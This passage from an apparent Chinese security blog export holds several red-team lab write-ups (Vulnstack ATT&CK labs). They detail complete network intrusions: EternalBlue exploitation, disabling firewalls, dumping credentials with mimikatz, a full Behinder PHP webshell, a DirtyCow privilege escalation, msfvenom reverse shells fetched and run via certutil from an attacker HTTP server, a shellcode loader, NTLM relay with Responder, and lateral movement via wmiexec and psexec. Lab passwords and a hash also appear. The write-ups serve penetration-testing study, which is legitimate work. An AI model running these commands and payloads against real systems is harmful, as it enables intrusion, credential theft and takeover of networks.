windows/meterpreter/bind_tcp\n\n\n\n\n\n\n\n同样利用失败，猜测是目标靶机开启了防火墙。\n使用 auxiliary/admin/smb/ms17_010_command 模块 执行命令\n执行 whoami\n\n\n\n\n\n\n\n可以成功执行命令，通过执行命令的方式来关闭防火墙。\nnetsh advfirewall set allprofiles state off\n\n\n\n\n\n\n\n\n再次使用 exploit/windows/smb/ms17_010_eternalblue 模块进行利用\n\n\n\n\n\n\n\n依旧失败\n使用 exploit/windows/smb/ms17_010_psexec模块\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功得到system shell\n后渗透使用后渗透工具kiwiload kiwi # 加载creds_all # 列举所有凭据\n\n\n\n\n\n\n\n\n拿到 liukaifeng01用户的密码hongrisec@2022\n开启远程桌面run post/windows/manage/enable_rdp\n\n\n\n\n\n\n\n\n使用kali自带的rdesktop连接rdesktop 192.168.52.138\n\n注意 当我们使用rdesktop去连接 192.168.52.0 这个网段是连接不上的，在MSF中添加的路由，只适用于MSF中。\n使用MSF+proxychains4进行内网流量转发使用 auxiliary/server/socks_proxy 开启 socks5服务\n\n\n\n\n\n\n\n配置 proxychains4\nsudo vim /etc/proxychains4.conf\n\n\n\n\n\n\n\n\nproxychains4 rdesktop 192.168.52.138\n\n\n\n\n\n\n\n\n用刚刚获取到的用户成功登录\n\n\n\n\n\n\n\n至此，拿下来域控\n内网渗透：域成员服务器通过fscan扫描，可以知道这两台靶机都存在ms17-010漏洞，接下来通过，MSF对另一台靶机192.168.52.141进行漏洞利用。\n永恒之蓝漏洞利用使用 exploit/windows/smb/ms17_010_psexec模块进行漏洞利用\n\n\n\n\n\n\n\n经过多次尝试，一直无法成功利用\n尝试使用 auxiliary/admin/smb/ms17_010_command 执行命令\n\n\n\n\n\n\n\n可以成功执行命令\n接下来的利用思路利用该模块是创建用户，开启3389远程登录上去\n首先set command net user faany &quot;hongrisec@2022&quot; /add添加用户（注意 这里如果密码设置太简单，是不会创建成功的，我也是踩坑多次才发现）\n\n\n\n\n\n\n\n然后 set command net localgroup administrators faany /add添加管理员权限\n\n\n\n\n\n\n\nset COMMAND net localgroup administrators 查看管理员组用户\n\n\n\n\n\n\n\nset command &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;执行命令开启3389端口\n\n\n\n\n\n\n\n远程桌面连接\nproxychains4 rdesktop 192.168.52.141\n\n\n\n\n\n\n\n\n成功拿下\n相关知识点内网主机发现几种方式proxychains4+nmap (比较慢)\n\nmsf模块\npost/windows/gather/arp_scanner(比较快)\n\nfscan（比较快，还可以扫描漏洞） \n远程桌面登录命令注册表开启  3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f关闭防火墙netsh advfirewall set allprofiles state off\n\n靶机执行命令回显乱码chcp 65001\n\nfrp 开启socks5代理服务服务端（linux）\n配置\nfrps.ini\n[common]bind_port = 7000\n\n启动\n./frps -c frps.ini\n\n\n\n\n\n\n\n\n客户端（windows）\n配置\nfrpc.ini\n[common]server_addr = 172.20.10.128 # 服务端ipserver_port = 7000[socks5]type = tcpremote_port = 8088plugin = socks5\n\n启动\nfrpc.exe -c frpc.ini\n\n\n\n\n\n\n\n\n使用Proxifier测试 \n\n\n\n\n\n\n\n\n\n\n成功\n通过 msf ms17-010 执行命令 创建用户并开启远程桌面set command net user fany p@ssword! /add添加用户\nset command net localgroup administrators fany /add添加管理员权限\nset COMMAND net localgroup administrators 查看管理员组用户\nset command &#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;执行命令开启3389端口\nset command netsh firewall set opmode mode=disable 关闭防火墙\n后渗透：利用msf模块开启远程桌面run post/windows/manage/enable_rdp\n后渗透攻击kiwi用法creds_all：列举所有凭据creds_kerberos：列举所有kerberos凭据creds_msv：列举所有msv凭据creds_ssp：列举所有ssp凭据creds_tspkg：列举所有tspkg凭据creds_wdigest：列举所有wdigest凭据dcsync：通过DCSync检索用户帐户信息dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RIDgolden_ticket_create：创建黄金票据kerberos_ticket_list：列举kerberos票据kerberos_ticket_purge：清除kerberos票据kerberos_ticket_use：使用kerberos票据kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令lsa_dump_sam：dump出lsa的SAMlsa_dump_secrets：dump出lsa的密文password_change：修改密码wifi_list：列出当前用户的wifi配置文件wifi_list_shared：列出共享wifi配置文件/编码\n\n总结通过外网的web服务器利用mysql写马到全局日志拿到一个webshell权限，再通过cs自带的提权工具进行提权，拿到靶机的root权限，因为做代理，MSF做代理要方便些，就通过MSF来管理shell，最后通过永恒之蓝漏洞拿下内网的两台靶机，整个过程都不是很难，通过这个靶场也学到了渗透后一些信息收集的方式以及后渗透工具的利用，再打的时候，靶机ip会自动更换，导致常常拿到的shell总是掉，然后还需要重新生成马儿来拿shell，这点会很烦，有点考验耐心。\n参考文章ATK&amp;CK红队评估实战靶场（一）的搭建和模拟攻击过程全过程\nhttps://blog.csdn.net/qq_41821603/article/details/109948920 \n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"ATK&CK红队评估实战靶场（三）","url":"/2022/12/27/ATK&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%89%EF%BC%89/","content":"前言靶机详细信息\nhttp://vulnstack.qiyuanxuetang.net/vuln/detail/5/\n\n环境搭建拓扑图\n\n\n\n\n\n\n\n首先需要添加一个虚拟网卡 VMnet2\n\n\n\n\n\n\n\n这里还将DHCP的起始ID地址设置成了192.168.93.5。\n然后安装拓扑图上的方式添加网卡即可。\n还需要注意的就是，靶机web-centos需要重启一下网卡才能获取到IP。\nifdown eth0 # 禁用eth0网卡ifup eth0 # 启用eth0网卡\n\n全部虚拟机获取到的IP\nKali\n192.168.10.179\n\nCentos-web\n外网：192.168.10.114内网：192.168.93.110\n\nubuntu-web\n内网：192.168.93.120\n\nwin 7 \n内网：192.168.93.30\n\nwin server 2008\n内网：192.168.93.20\n\nwin server 2012\n内网：192.168.93.10\n\n攻入内网主机发现nmap -sn 192.168.10.0/24\n\n\n\n\n\n\n\n\n在重置网卡的时候就已经知道了IP，这里扫也扫出来了，为192.168.10.114。\n端口扫描sudo nmap -sS -Pn -sV -v -p 1-65535 192.168.10.114\n\n\n\n\n\n\n\n\n目标靶机开放了 22,80,3306，直接访问 80端口\n\n\n\n\n\n\n\n通过站点图标，可以知道是个 Joomla!站点，这套源码存在许多的漏洞，需要继续信息收集，找到具体的版本号。\n目录扫描python3 .\\dirsearch.py -u &quot;http://192.168.10.114/&quot;\n\n\n\n\n\n\n\n\n在/configuration.php~ 泄露了数据库登录信息\n\n\n\n\n\n\n\npublic $user = &apos;testuser&apos;;public $password = &apos;cvcvgjASD!@&apos;;\n\n漏洞利用尝试进行远程登录靶机的 mysql 数据库\n\n\n\n\n\n\n\n成功登录mysql数据库。\n在am2zu_users 表中可以发现，存储密码的password字段是经过加密的\n\n\n\n\n\n\n\n这个密码如果拿去爆破，费时费力还不一定跑得出来，这里通过官方给得密码重置文档来手动添加一个用户，就是手动添加一个用户记录。\n\nhttps://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn\n\n\n\n\n\n\n\n\n复制sql语句过来，还需要手动改一下表前缀，改为 am2zu\nINSERT INTO `am2zu_users`   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)VALUES ('Administrator2', 'admin2',    'd2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199', '', NOW(), NOW(), NOW());INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)VALUES (LAST_INSERT_ID(),'8');\n\n然后执行\n\n\n\n\n\n\n\n\n\n\n得到的用户名密码为 admin2:secret\n访问登录\nhttp://192.168.10.114/administrator/\n\n\n\n\n\n\n\n\n成功进入后台\n在 Extensions-&gt;Templates-&gt;Templates 处，可以对模板文件进行编辑。\n\n\n\n\n\n\n\n接下来，在 index.php  中插入一句话木马\n\n\n\n\n\n\n\n然后蚁剑添加 shell\nhttp://192.168.10.114/templates/beez3/index.php\n\n\n\n\n\n\n\n\n这里不知道什么原因，添加不上。\n接下来，在模板编辑页面，重新创建一个文件\n\n\n\n\n\n\n\n然后将冰蝎的shell 写进去\n&lt;?php@error_reporting(0);session_start();    $key=\"e45e329feb5d925b\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\t$_SESSION['k']=$key;\tsession_write_close();\t$post=file_get_contents(\"php://input\");\tif(!extension_loaded('openssl'))\t&#123;\t\t$t=\"base64_\".\"decode\";\t\t$post=$t($post.\"\");\t\t\t\tfor($i=0;$i&lt;strlen($post);$i++) &#123;    \t\t\t $post[$i] = $post[$i]^$key[$i+1&amp;15];     \t\t\t&#125;\t&#125;\telse\t&#123;\t\t$post=openssl_decrypt($post, \"AES128\", $key);\t&#125;    $arr=explode('|',$post);    $func=$arr[0];    $params=$arr[1];\tclass C&#123;public function __invoke($p) &#123;eval($p.\"\");&#125;&#125;    @call_user_func(new C(),$params);?&gt;\n\n\n\n\n\n\n\n\n然后使用冰蝎客户端添加\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以列目录、上传文件、但是不能执行命令。\n\n\n\n\n\n\n\n在phpinfo 页面中可以看到禁用了一些 执行命令的函数。\n绕过disable_functions\n如果蚁剑能连得上，那么直接用蚁剑自带的插件绕过更方便些。\n\n这里我们使用蚁剑连接不上，所以只有手动绕过。\n首先在github下载\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n\n将文件解压，通过冰蝎将bypass_disablefunc.php和bypass_disablefunc_x64.so上传到网站目录下\n\n\n\n\n\n\n\n紧接着访问\nhttp://192.168.10.114//bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc_x64.so\n\n\n\n\n\n\n\n\n已经是可以成功执行命令，这里已经算是得到了一个webshell，但是使用起来较为麻烦。\n最开始，我想尝试通过该靶机执行一个 反弹shell的时候来控制靶机的时候，发现怎么都反弹不过来，后来才这个靶机的IP是内网IP，该主机的web服务器是通过 192.168.10.114这台机器上的nginx服务器进行转发的，我们也只能通过 nginx 服务器 来跟内网的web服务器进行通信，那么也可以通过该 webshell 做个简单的信息收集。\n主机信息收集根据网上给的wp，在 /tmp/mysql/目录下 发现  test.txt文件\n\n\n\n\n\n\n\nadduser wwwuserpasswd wwwuser_123Aqx\n\n这个用户名密码192.168.10.114这台靶机的登录口令。\n接下来，我们通过xshell连接上去。\n\n\n\n\n\n\n\n成功连了上去，但是无法通过sudo提权到 root。\n接下来尝试进行提权。\n提权查看内核系统版本信息\nuname -acat /etc/redhat-release\n\n\n\n\n\n\n\n\n该靶机内核版本为 2.6.32-431.el6.x86_64，系统为 CentOS release 6.5 (Final)，低版本的系统存在 脏牛 通用提权漏洞。\n首先下载提权脚本\nhttps://github.com/Rvn0xsy/linux_dirty/archive/refs/heads/master.zip\n\n解压后得到 一个 dirty.c文件，将该文件上传到靶机的 /tmp目录下\n\n\n\n\n\n\n\n编译&amp;执行\ngcc -pthread dirty.c -o dirty -lcrypt./dirty\n\n注意 在执行的时候，会对 /etc/passwd 文件做一个备份，会将备份文件放在 /tmp目录下，文件名为passwd.bak，但是当前靶机中已经存在一个 passwd.bak的备份文件，执行前可以先删掉或者重命名这个文件。\n\n\n\n\n\n\n\n接下来，查看一下passwd 下是否已经添加了 rooter这个用户名\n\n\n\n\n\n\n\n可以看到已经成功将root替换成了rooter这个用户名，这个用户名的密码也被替换成了Hello@World，在提权脚本的README中可以看到。\n提权到 rooter\nsu rooter\n\n\n\n\n\n\n\n\n提权成功\n为了方便后续渗透，我们通过MSF生成一个反弹shell，在MSF中上线该靶机。\n权限维持MSF生成 Linux 后门\nmsfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.179 lport=9876 -f elf &gt; shell9876\n\nMSF开启监听\nuse exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset lhost 0.0.0.0set lport 9876exploit -j\n\n接下来，将生成的木马上传到 靶机中运行\n# 赋予执行权限chmod u+x shell9876 # 后台运行nohup ./shell9876 &amp;\n\n\n\n\n\n\n\n\nMSF收到shell\n\n\n\n\n\n\n\nMSF收到的shell 是为了方便后续做socks代理、横向移动等一些事情。\n内网信息收集首先查看一下本机的网卡\n\n\n\n\n\n\n\n两张网卡，发现内网网段192.168.93.0\n这里可以选择MSF的以下模块来进行内网主机发现\nauxiliary/scanner/discover/arp_sweep\n\n也可以使用 Nmap + proxychains4 进行扫描。\n但是都不如直接上传fscan来扫的效率高，当然也需要考虑机器上是否杀软的情况。\n./fscan_amd64 -h 192.168.93.0/24\n\n\n\n\n\n\n\n\n通过 fscan 可以得到一些信息\n(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.20   is alive192.168.93.10:88 open192.168.93.120:22 open192.168.93.100:22 open192.168.93.100:80 open192.168.93.20:80 open192.168.93.30:139 open192.168.93.20:139 open192.168.93.10:139 open192.168.93.20:135 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.120:3306 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.20:445 open192.168.93.30:445 open192.168.93.10:445 open192.168.93.120:80 open[*] NetBios: 192.168.93.10   [+]DC WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600 [*] NetBios: 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2 [*] 192.168.93.30  (Windows 7 Professional 7601 Service Pack 1)[+] mysql:192.168.93.100:3306:root 123[+] mysql:192.168.93.120:3306:root 123\n\n通过以上信息，可以知道内网存活的主机、各个主机开放的端口、域控以及使用的操作系统还有mysql的弱口令。\n内网的三台windows主机都开启了445端口，但是fscan的扫描结果显示并不存在永恒之蓝漏洞，这里我们还是使用MSF 的 检测模块 进行再一次尝试。\n横向移动准备刚刚我们通过MSF上线了centos的靶机，接下来，我们通过在MSF自带的模块在添加一条路由\nrun post/multi/manage/autoroute\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这时候已经自动给我们添加通向内网网段的路由了。\n开启socks5服务再用auxiliary/server/socks_proxy开启一个socks5服务\n\n\n\n\n\n\n\n内网渗透：win2008在使用fscan 对内网网段进行扫描的时候，已经发现内网的几台主机不存在永恒之蓝漏洞了。\n192.168.93.10的88端口也没有任何可利用的点，192.168.93.20的80端口也是一样。\n靶机192.168.93.20还开启了1433端口，使用最开始搜集到mysql的用户名密码testuser:cvcvgjASD!@尝试进行登录。\n在物理机上使用Navicat工具配置socks5代理进行连接\n在工具-&gt;选项\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以成功连接上\n尝试使用mssql执行命令\n首先启用xp_cmdshell\nEXEC sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;, 1;RECONFIGURE;\n\n\n\n\n\n\n\n\n提示没有权限，无法进一步利用。\nNTLM Relay攻击SMB服务还有一种攻击方法，那就是 NTLM Relay攻击 ，了解具体原理，看https://blog.csdn.net/whatday/article/details/107698383#t1 这篇文章，这里只写利用过程。\n首先下载 responder工具\nhttps://github.com/SpiderLabs/Responder\n\n上传至 centos靶机中，执行\npython Responder.py -I eth1 -rv\n\n\n\n\n\n\n\n\n然后再MSF中，使用auxiliary/admin/mssql/mssql_ntlm_stealer模块\nuse auxiliary/admin/mssql/mssql_ntlm_stealerset RHOSTS 192.168.93.20set USERNAME testuserset PASSWORD cvcvgjASD!@set SMBPROXY 192.168.93.100\n\n\n\n\n\n\n\n\n再回到 centos靶机中\n\n\n\n\n\n\n\n成功抓到了 win 2008 的 NTLM hash\nAdministrator::WIN2008:1122334455667788:746E3F2D7EB3DDB6304D15B04E0D32E8:0101000000000000F3DE6739961AD9019214FF4776694A460000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000BEAB9161CC52D56AF03D7933BB8CE5D72D7FA0D284620B4D4240B1C1C3AB1D720000000000000000\n\n这里可以用kali 中的 john 来爆破出 密码\njohn hash.txt --wordlist=passwd.txt\n\n\n\n\n\n\n\n\n得到密码 123qwe!ASD ，爆破出这种密码，确实需要一本很强大的字典。\n不仅仅是这一种方法，还有其他的利用办法，由于各种环境原因，但是我都没成功，放个链接。\nhttps://blog.csdn.net/whatday/article/details/107698383#t6\n拿到密码后 ，可以使用impacket工具的 wmiexec.py来执行命令\nimpacket下载地址\nhttps://github.com/fortra/impacket\n\n在kali下\nproxychains4 python3 wmiexec.py &apos;administrator:123qwe!ASD@192.168.93.20&apos;\n\n\n\n\n\n\n\n\n权限维持接下来，远程下载一个MSF的反弹shell，然后执行。\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8899 -f exe &gt; 8899.exe\n\n上传到 centos靶机中\n\n\n\n\n\n\n\n利用python在当前目录下 开启一个 HTTP服务\npython -m SimpleHTTPServer\n\n\n\n\n\n\n\n\nMSF开启监听\nset RHOST 192.168.93.20set LPORT 8899set payload windows/x64/meterpreter/bind_tcp\n\n远程下载并执行\ncertutil -urlcache -split -f http://192.168.93.100:8000/8899.exe 8899.exe\n\n\n\n\n\n\n\n\nMSF收到shell\n\n\n\n\n\n\n\n还不是 system\n提权一条命令提权\ngetsystem\n\n\n\n\n\n\n\n\n主机信息收集加载后渗透利用工具kiwi\nload kiwi\n\n获取用户登录凭据\ncreds_kerberos\n\n\n\n\n\n\n\n\n成功抓取了 域控服务器的明文密码\nAdministrator  TEST.ORG  zxcASDqw123!!Administrator  WIN2008   123qwe!ASD\n\n内网渗透：域控服务器依旧使用impacket工具的 wmiexec.py来执行命令\nproxychains4 python3 wmiexec.py &apos;administrator:zxcASDqw123!!@192.168.93.10&apos;\n\n\n\n\n\n\n\n\n权限维持接下来，还是老办法，远程下载一个MSF的反弹shell，然后执行。\nmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8899 -f exe &gt; 8899.exe\n\n上传到 centos靶机中\n\n\n\n\n\n\n\n利用python在当前目录下 开启一个 HTTP服务\npython -m SimpleHTTPServer\n\n\n\n\n\n\n\n\nMSF开启监听\nset RHOST 192.168.93.10set LPORT 8899set payload windows/x64/meterpreter/bind_tcp\n\n远程下载并执行\ncertutil -urlcache -split -f http://192.168.93.100:8000/8899.exe 8899.exe\n\n\n\n\n\n\n\n\n但是这里MSF未收到反弹shell，可能是开了防火墙的原因。\n关闭防火墙\nnetsh advfirewall set allprofiles state off\n\nMSF收到shell\n\n\n\n\n\n\n\n开启远程桌面\nrun post/windows/manage/enable_rdp\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n在Documents目录下找到 秘密文件\n\n\n\n\n\n\n\n内网渗透：pc192.168.93.30 这台靶机依旧可以使用 wmiexec.py来执行命令，因为最终都是用MSF来管理，所以这里我们可以通过exploit/windows/smb/psexec 来获得一个shell。\nuse exploit/windows/smb/psexecset RHOSTS 192.168.93.30set SMBUser administratorset SMBPass 123qwe!ASDset payload windows/meterpreter/bind_tcp\n\n\n\n\n\n\n\n\n相关知识点mssql渗透相关命令mssql列目录\nexecute master..xp_dirtree &apos;c:\\&apos;,1,1\n\nmssql查看版本\nselect @@version\n\nsql server 2005版本以后默认关闭，需要开启后使用\n启用xp_cmdshell\nEXEC sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;, 1;RECONFIGURE;\n\n执行系统命令\nexec master..xp_cmdshell &apos;whoami&apos;\n\n写入webshell\nexec master..xp_cmdshell &apos;echo ^&lt;%eval request(&quot;x&quot;)%^&gt; &gt;e:\\shell.aspx&apos;\n\n主机信息收集uname -a    # 获取所有版本信息uname -m    # 获取Linux内核架构cat /proc/version    # 获取内核信息cat /etc/*-release   # 发布信息cat /etc/issue    # 发布信息hostname    # 获取主机名cat /etc/passwd    # 列出系统所有用户cat /etc/group    # 列出系统所有组w    # 查看目前登录的用户whoami    # 查看当前用户id    # 查看当前用户信息sudo -l    # 列出目前用户可执行与无法执行的指令ps aux    # 查看进程信息ls -la /etc/cron*    # 查看计划任务ifconfig -a    # 列出网络接口信息cat /etc/network/interfaces    # 列出网络接口信息arp -a    # 查看系统arp表route    # 打印路由信息netstat -anplt    # 打印本地端口开放信息iptables -L    # 列出iptable的配置规则\n\nMSF开启全局代理setg proxies socks5:127.0.0.1:1080\n\n参考文章https://xz.aliyun.com/t/6988#toc-0 Vlunstack ATT&amp;CK实战系列——红队实战（三）Writeuphttps://blog.csdn.net/whatday/article/details/107698383 内网渗透测试：NTLM Relay攻击分析\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"ATK&CK红队评估实战靶场（五）","url":"/2023/01/02/ATK&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%94%EF%BC%89/","content":"前言靶机详细信息\nhttp://vulnstack.qiyuanxuetang.net/vuln/detail/7/\n\n环境搭建靶机密码\nwin7sun\\heart 123.comsun\\Administrator dc123.com (后期更改为qwe)2008sun\\admin 2020.com\n\n拓扑图\n\n\n\n\n\n\n\n首先添加一张VMnet2的网卡，子网设置为192.168.138.0，IP范围为5-254\n\n\n\n\n\n\n\n将该网卡应用于win7 和 win2008两台虚拟机，再将win7的第一张网卡设置为NAT，一定是要第一张网卡设置为NAT。\n\n\n\n\n\n\n\n登入到win7中，将wk1 waiwang网卡设置为自动获得IP地址。\n\n\n\n\n\n\n\n在C盘根目录，再将phpStudy启动\n\n\n\n\n\n\n\n各个虚拟机IP\nKali\n\n\n\n\n\n\n\ncobalt strike 服务器 在Kali中开启\nWin7\n\n\n\n\n\n\n\nWindows 2008\n\n\n\n\n\n\n\n攻入内网主机发现nmap -sn 172.20.10.1/24\n\n\n如果目标靶机开了防火墙，但又没开启http等服务，使用nmap是无法发现目标靶机的。\n\n但是可以使用kali自带的 netdiscover工具进行发现。\nsudo netdiscover -i eth0 -r 172.20.10.0/24\n\n\n\n\n\n\n\n\n这里扫到了 172.20.10.7\n端口扫描sudo nmap -sS -Pn -sV -v -p 1-65535 172.20.10.7\n\n\n\n\n\n\n\n\n开放了80、135、3306端口，通过扫描结果可得知可能是一个php的站点。\nThinkPhP 的站点\n\n\n\n\n\n\n\n\n\n\n报个错，得到版本5.0.22\n目录扫描python3 .\\dirsearch.py -u &quot;http://172.20.10.7/&quot;\n\n\n\n\n\n\n\n\n后门webshell爆破(失败)发现add.php为一个webshell页面\n\n\n\n\n\n\n\nBurp爆破一下\n\n\n\n\n\n\n\n并没有爆破出来。\nThinkPhP框架漏洞利用使用工具检测ThinkPhP自带的框架漏洞。\n\n\n\n\n\n\n\n找一个可以执行命令的漏洞\n\n\n\n\n\n\n\n已经可以执行命令了，但是仅仅只是执行命令并不能满足我们拿下内网的所有需求，这里我们将通过执行命令的方式来下载一个冰蝎的shell，然后用冰蝎的客户端来管理该webshell。\n我已经将冰蝎上传到Kali中，接下来用python在冰蝎的server目录下开启http服务。\npython3 -m http.server\n\n\n\n\n\n\n\n\n执行windows下远程下载文件命令\ncertutil -urlcache -split -f http://172.20.10.129:8000/shell.php shell.php\n\n\n\n\n\n\n\n\n\n\n\n冰蝎客户端连接\n\n\n\n\n\n\n\n以上这种方式，如果是在有杀软的情况下，远程下载文件很容易被杀软拦截，接下来介绍一种更安全的方式，使用shellcode加载器来加载恶意代码来进行CS上线。\n在实战中更安全的方式首先下载一个shellcode加载器\nhttps://github.com/clinicallyinane/shellcode_launcher\n\n解压后，上传至kali中\n\n\n\n\n\n\n\n然后，在CS中创建一个监听\n\n\n\n\n\n\n\n生成一个Raw类型的二进制文件\n\n\n\n\n\n\n\n将生成的payload.bin 拷贝至Kali中和shellcode加载器放置同一目录下。\n\n\n\n\n\n\n\n接下来在kali中的shellcode加载器目录下启动一个smb服务\nsudo impacket-smbserver -smb2support test $(pwd)\n\n\n\n\n\n\n\n\n检测smb服务是否正常\nnet view \\\\172.20.10.129\n\n\n\n\n\n\n\n\n查看smb中共享的文件\ndir \\\\172.20.10.129\\test\n\n\n\n\n\n\n\n\n通过xcopy将 payload.bin和shellcode_launcher.exe拷贝至靶机中\nxcopy \\\\172.20.10.129\\test\\payload.binxcopy \\\\172.20.10.129\\test\\shellcode_launcher.exe\n\n\n\n\n\n\n\n\n在ThinkPHP工具中调用shellcode加载器加载shellcode\nshellcode_launcher.exe -i payload.bin\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCS中也成功上线。\n权限维持之前都是用MSF来管理shell，这次我们通过CS来管理shell，学习一下CS的使用。\n首先在CS中创建一个监听\n\n\n\n\n\n\n\n\n\n\n生成 powershell Command  \n\n\n\n\n\n\n\n\n\n\n最后得到一串字符\n\n\n\n\n\n\n\n将该字符串拷贝到冰蝎客户端中执行\n\n\n\n\n\n\n\nCS也成功上线\n提权\n\n\n\n\n\n\n\n\n\n等待一会儿后\n\n\n\n\n\n\n\n成功提到system权限。\n主机信息收集查看网卡信息\nshell ipconfig /all\n\n\n\n\n\n\n\n\n发现域名sun.com和内网网段192.168.138.136\n对域名做DNS解析\nshell nslookup sun.com\n\n\n\n\n\n\n\n\n192.168.138.138 主机是域控\n查看系统详细信息\nshell  systeminfo\n\n\n\n\n\n\n\n\n查看域内所有用户列表\nshell net group /domain\n\n\n\n\n\n\n\n\n查看域成员计算机列表\nshell net group &quot;domain computers&quot; /domain\n\n\n\n\n\n\n\n\n查看域管理员用户\nshell net group &quot;domain admins&quot; /domain\n\n\n\n\n\n\n\n\n抓取登录口令\n\n\n\n\n\n\n\n\n\n\n(域管理员用户的账号密码)* Username : Administrator * Domain   : SUN* Password : qwe123@* Username : leo* Domain   : SUN* Password : 123.com\n\n开启远程桌面服务\nshell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\n\n关闭防火墙\nshell netsh advfirewall set allprofiles state off\n\n\n\n\n\n\n\n\nmstsc连接\n使用sun\\Administrator和dc123.com进行登录\n\n\n\n\n\n\n\n接下来，上传fscan，对内网主机进行扫描\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nshell c:/fscan32.exe -h 192.168.138.1/24\n\n\n\n\n\n\n\n\n(icmp) Target 192.168.138.136 is alive(icmp) Target 192.168.138.138 is alive[*] Icmp alive hosts len is: 2192.168.138.138:139 open192.168.138.136:139 open192.168.138.138:88 open192.168.138.136:3306 open192.168.138.138:445 open192.168.138.136:445 open192.168.138.138:135 open192.168.138.136:135 open192.168.138.136:80 open[*] alive ports len is: 9start vulscan[+] 192.168.138.136\tMS17-010\t(Windows 7 Professional 7601 Service Pack 1)[*] NetInfo:[*]192.168.138.136   [-&gt;]win7   [-&gt;]192.168.138.136   [-&gt;]172.20.10.7[+] 192.168.138.138\tMS17-010\t(Windows Server 2008 HPC Edition 7600)[*] NetBios: 192.168.138.138 [+]DC DC.sun.com                    Windows Server 2008 HPC Edition 7600 [*] NetInfo:[*]192.168.138.138   [-&gt;]DC   [-&gt;]192.168.138.138[*] WebTitle: http://192.168.138.136    code:200 len:931    title:None\n\n从扫描结果中，可以发现就两台主机，一台本机，一台域控，域控的IP为192.168.138.138，操作系统为Windows Server 2008 HPC Edition 7600，并且存在MS17-10漏洞。\n内网渗透：域控服务器在对win7靶机进行信息收集的时候，我们抓取到了域控的账号密码。\n接下来，使用CS自带的psexec64进行横向移动上线。\n首先，创建一个监听\n\n\n\n\n\n\n\n然后，点击这个靶心，看域控的IP是否存在。\n\n\n\n\n\n\n\n不存在，先进行端口扫描\n\n\n\n\n\n\n\n\n\n\n再次点击这个靶心就会出现\n\n\n\n\n\n\n\n接下来\n\n\n\n\n\n\n\n选中域控的IP，然后右键。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成功上线\n使用CS没有那么繁琐的步骤，上线还是较为简单。\n其他方法的尝试通过wmiexec.py（需要通过frp开启一个代理）\nproxychains4 python3 wmiexec.py &quot;administrator:qwe123@@192.168.138.138&quot;\n\n\n\n\n\n\n\n\n可以执行命令\n使用MSF直接对域控的MS17-010进行利用\n\n\n\n\n\n\n\n一直失败。\n知识点汇总windows下远程下载文件命令certutil -urlcache -split -f http://172.20.10.129:8000/shell.php shell.php\n\nKali中启动一个SMB服务sudo impacket-smbserver -smb2support test $(pwd)\n\n参考文章https://blog.csdn.net/weixin_45682839/article/details/124512995\n记一次在VulnStackATT&amp;CK5靶场中使用CobaltStrike的渗透之旅.\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"ATK&CK红队评估实战靶场（四）","url":"/2022/12/30/ATK&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E5%9B%9B%EF%BC%89/","content":"前言靶机详细信息\nhttp://vulnstack.qiyuanxuetang.net/vuln/detail/6/\n\n环境搭建拓扑图\n\n\n\n\n\n\n\n首先添加一张VMnet2的网卡\n\n\n\n\n\n\n\n配置子网IP为192.168.183.0，并且将该网卡应用于 